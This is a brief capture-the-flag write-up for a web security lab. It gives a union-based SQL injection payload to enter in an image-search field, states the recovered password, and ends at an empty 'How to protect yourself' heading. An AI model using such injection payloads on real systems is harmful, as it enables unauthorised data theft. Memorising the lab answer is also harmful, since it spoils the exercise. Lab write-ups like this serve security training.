### CTF

The solution of this CTF is very much analogous to this of 03_SQL_Union-based_Injection_Members. Enter the following SQL request in the "Image number" field, found in the "Search image" page.

    1 AND 1=2 UNION SELECT title, comment FROM list_images

Follow the instruction. The password is **albatroz**

### How to protect yourself
